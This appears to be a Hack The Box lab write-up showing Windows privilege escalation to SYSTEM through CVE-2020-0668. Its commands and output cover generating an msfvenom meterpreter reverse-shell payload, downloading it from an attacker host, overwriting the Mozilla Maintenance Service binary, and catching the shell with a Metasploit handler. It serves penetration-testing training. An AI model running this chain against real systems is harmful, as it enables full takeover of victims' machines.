# Mozilla Maintenance Service

## Standard Privileges

```pwsh
PS C:\Users\htb-student> icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

```output title="Output" hl_lines="3"
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

## Payload

```sh
my@attack:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.164 LPORT=9001 -f exe -o maintenanceservice.exe
```

## Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

## Transferring

```pwsh
PS C:\Users\htb-student> Invoke-WebRequest -Uri "http://10.10.14.164:8888/maintenanceservice.exe" -OutFile "C:\Tools\maintenanceservice-temp.exe"
PS C:\Users\htb-student> Invoke-WebRequest -Uri "http://10.10.14.164:8888/maintenanceservice.exe" -OutFile "C:\Tools\maintenanceservice.exe"
```

## [CVE-2020-0668](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668)

### Build Results

```pwsh
PS C:\Users\htb-student> Get-ChildItem C:\Tools\CVE-2020-0668\bin\Debug
```

```output title="Output"
    Directory: C:\Tools\CVE-2020-0668\bin\Debug


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/25/2021   2:03 PM          11264 CVE-2020-0668.exe
-a----        3/25/2021   1:58 PM            186 CVE-2020-0668.exe.config
-a----        3/25/2021   2:03 PM          26112 CVE-2020-0668.pdb
-a----        2/10/2020   2:01 AM        1564672 NtApiDotNet.dll
-a----        2/10/2020   2:01 AM        1305402 NtApiDotNet.xml
```

### Elevating Privileges

```pwsh
PS C:\Users\htb-student> C:\Tools\CVE-2020-0668\bin\Debug\CVE-2020-0668.exe "C:\Tools\maintenanceservice-temp.exe" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

```output title="Output"
[+] Moving C:\Tools\maintenanceservice-temp.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\ba0tv5z4.a1q
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\fcdd5a04-7d14-4725-bb13-0dd41137033e.pbk
[+] Cleaning up
[+] Done!
```

## Replacing Service Binary

```pwsh
PS C:\Users\htb-student> cmd.exe /c copy /Y "C:\Tools\maintenanceservice.exe" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

## Metasploit

```text title="handler.rc" linenums="1"
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.164
set LPORT 9001
run
```

```sh
my@attack:~$ msfconsole -q -r handler.rc
```

```output title="Output"
[*] Started reverse TCP handler on 10.10.14.164:9001
```

## Getting Reverse Shell

```pwsh
PS C:\Users\htb-student> sc.exe start MozillaMaintenance
```

## Meterpreter Session Established

```sh
meterpreter > getuid
```

```output title="Output"
Server username: NT AUTHORITY\SYSTEM
```
